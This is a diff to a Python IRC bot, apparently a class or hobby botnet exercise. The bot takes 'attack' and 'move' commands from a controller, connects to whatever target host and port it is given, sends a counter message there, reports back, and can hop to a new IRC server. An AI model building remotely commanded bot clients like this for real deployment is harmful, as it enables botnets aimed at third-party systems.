@@ -9,6 +9,7 @@ CHAN = ""
 BUF_SIZE = 1024
 
 botName = ""
+atk_couter=1
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -60,7 +61,7 @@ def listen(s):
                     print(clientNick[0])
                     status(clientNick[0],s)
                 elif msg[1] == "attack":
-                    attack(msg[2], msg[3])
+                    attack(msg[2], msg[3], clientNick[0])
                 elif msg[1] == "move":
                     print(clientNick[0])
                     break
@@ -69,7 +70,7 @@ def listen(s):
 
        print(rec)
 
-    move(msg[2], msg[3], msg[4], clientNick)
+    move(msg[2], msg[3], msg[4], clientNick[0])
 
 
 #from carlos' twitch IRC bot, idk if it works with other IRCs
@@ -102,22 +103,29 @@ def status(clinetNick,s):
     s.send(msg.encode('utf-8'))
     #private message controller
 
-def attack(atkhost, atkport):
-    atkmsg = "1"
-    success = False
+def attack(atkhost, atkport, clinetNick):
+    global atk_couter
+    atkmsg = str(atk_couter) + " " + botName +"\n"
+    success=False
     try:
-        atkSock = socket.socket()
-        atkSock.connect((atkhost, atkport))
-        atkSock.send(atkmsg)
+
+        atkSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        atkSock.connect((atkhost, int(atkport)))
+        atkSock.send(atkmsg.encode('utf-8'))
         atkSock.close()
         success = True
     except:
         print("attack failed")
 
-    #report back to controller
+    atk_couter += 1
+    res = "PRIVMSG "+clinetNick+" :" +PASS + " attack "+str(success)+" "+botName+"\r\n"
+    s.send(res.encode('utf-8'))
+
 
 def move(newhost, newport, newchan, clientNick):
-    reportmsg = "PRIVMSG %s %s moved\r\n" % (clientNick, PASS)
+    global s
+    reportmsg = "PRIVMSG %s :%s moved\r\n" % (clientNick, PASS)
+    print(reportmsg)
     s.send(reportmsg.encode('utf-8'))
     success = False
     s.send(("QUIT\r\n").encode('utf-8'))
@@ -134,24 +142,13 @@ def move(newhost, newport, newchan, clientNick):
         print(HOST)
         print(PORT)
 
-        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s2.connect((HOST, PORT))
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((HOST, PORT))
     except:
         print("failed to move to new channel")  # we may want to handle a few more specific errors, this is general for now
         sys.exit(1)
 
-        #join IRC
-    usr = "USER %s %s %s :%s\r\n" % (botName, botName, botName, botName)
-    s2.send(usr.encode('utf-8'))
-
-    #TODO : Need to check for nick collision
-
-    nic = "NICK %s \r\n" % (botName)
-    s2.send(nic.encode('utf-8'))
-    chan = "JOIN %s\r\n" % (CHAN)
-    s2.send(chan.encode('utf-8'))
-    success = True
-    listen(s2)
+    startConn()
 
     #if failure, keep trying? or maybe stay on old IRC?
 
